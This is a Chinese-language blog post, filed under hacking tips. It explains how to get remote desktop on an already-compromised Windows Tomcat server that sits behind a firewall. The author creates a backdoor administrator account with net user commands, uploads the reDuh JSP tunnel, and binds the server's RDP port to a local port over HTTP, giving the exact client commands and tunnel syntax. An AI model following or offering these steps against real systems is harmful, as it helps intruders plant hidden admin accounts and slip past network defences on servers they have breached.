---
layout: post
title: 利用reDuh打通HTTP隧道
categories:
- 雕虫小技
tags:
- Hack
- Windows
published: true
comments: true
---
在某些缺乏安全性的Windows服务器上，总会运行着一个Tomcat，上面跑着某些国内外包公司做的缺乏安全性的JSP程序。这些一环套一环的缺乏安全性就造就了一台可怜地服务器，暴露在Internet的某个小角落。但是有时，这些缺乏安全性的服务器会被一面强有力的防火墙保护着，这位忠实的卫士竭尽所能安慰着那千疮百孔的服务器。但是外来的捍卫终究抵不过自身的体弱多病……

说得这么矫情，其实只是假设一个环境。我们现在有一台跑Tomcat的Windows服务器，我们已经能够自由地上传一些文件，执行一些命令行——想必一般的Webshell都能做到这些。这时候我们想获取服务器的终极操控权——远程桌面，却发现3389端口却被防火墙挡住了，这该怎么办呢？

<!--more-->

## 准备工作

当然我们先看一下3389端口是否是开放的，命令行下执行`netstat -an`，如果能看到类似`TCP    0.0.0.0:3389 LISTENING`这样的字样就说明很有希望了。然后我们再新建一个用户吧。依次执行`net user username password /add`和`net localgroup administrators username /add`。这时候我们满心欢喜地想在机器上远程桌面连接服务器，却发现失败了。排除了一些IP排除策略的可能性后（在注册表中可以检查相关设置），多半就是防火墙的问题了。

{% img http://dayanjia.com/wp-content/uploads/2011/02/mstsc-error.png 406 272 "mstsc error" %}

## 使用reDuh建立隧道

[reDuh](http://www.sensepost.com/labs/tools/pentest/reduh)是由国外一个名叫Glenn Wilkinson的安全人员编写的一个通过HTTP协议建立隧道传输各种其他数据的工具。运行于服务器的JSP脚本接受HTTP请求，在本地转发给相应的端口，并接受本地端口的数据再通过HTTP发送给远程客户端。**这样本来应该走其他端口的数据变摇身一变，披上了HTTP协议的报文头，换走HTTP的端口了。**所有HTTP通道中的数据都是经过Base64编码的（Base64可以将二进制数据转换成ASCII字符序列，并且可以解码还原）。下面这张图详细地说明了reDuh的工作流程（图片汉化自[SensePost's BlackHat USA 2008 talk on tunnelling data in and out of networks](http://www.sensepost.com/cms/resources/labs/conferences/eye_of_the_needle/SensePost_Eye_of_a_Needle.pdf)）：

[{% img http://dayanjia.com/wp-content/uploads/2011/02/reDuh-tunnel-580x404.png 580 404 "reDuh tunnel" %}](http://dayanjia.com/wp-content/uploads/2011/02/reDuh-tunnel.png)

将JSP文件上传至服务器后，我们在自己机器上运行客户端建立连接：`java -jar reDuhClient.jar http://internal.bigcompany.com/uploads/reDuh.jsp`。产生输出：

```
[Info]Querying remote web page for usable remote service port
[Info]Remote RPC port chosen as 42000
[Info]Attempting to start reDuh from internal.bigcompany.com/uploads/reDuh.jsp.  Using service port 42000. Please wait...
[Info]reDuhClient service listener started on local port 1010
```

这时候我们登录进本机的1010端口，可以使用telnet或者netcat。登录后我们会看到`Welcome to the reDuh command line`的提示。输入`[createTunnel]1234:127.0.0.1:3389`便可以将远程服务器的3389端口和本地的1234端口绑定起来。

这时候我们便可以打开远程桌面连接，连接127.0.0.1:1234，然后就能看到熟悉的界面了。java的控制台会不断输出运行信息。因为绕了很多弯的缘故，所以远程桌面的速度并不快，但是毕竟连接上了，不是吗？

[{% img http://dayanjia.com/wp-content/uploads/2011/02/mstsc-580x448.png 580 448 %}](http://dayanjia.com/wp-content/uploads/2011/02/mstsc.png)

当需要断开连接的时候，我们只需要输入`[killReDuh]`即可。

## 隧道是个好东西

如果大家知道利用国外服务器的SSH隧道可以用来访问某些被“防火墙”挡住的国外网站的话，一定会觉得这似乎很熟悉。没错，只不过本文是使用的HTTP的80端口，而那是利用的SSH的22端口，采用的协议不同而已。

隧道就是这么个好东西，能够绕过防火墙的限制，在原本不属于自己的道路上跑运输——这就是“隧道”的本意吧？
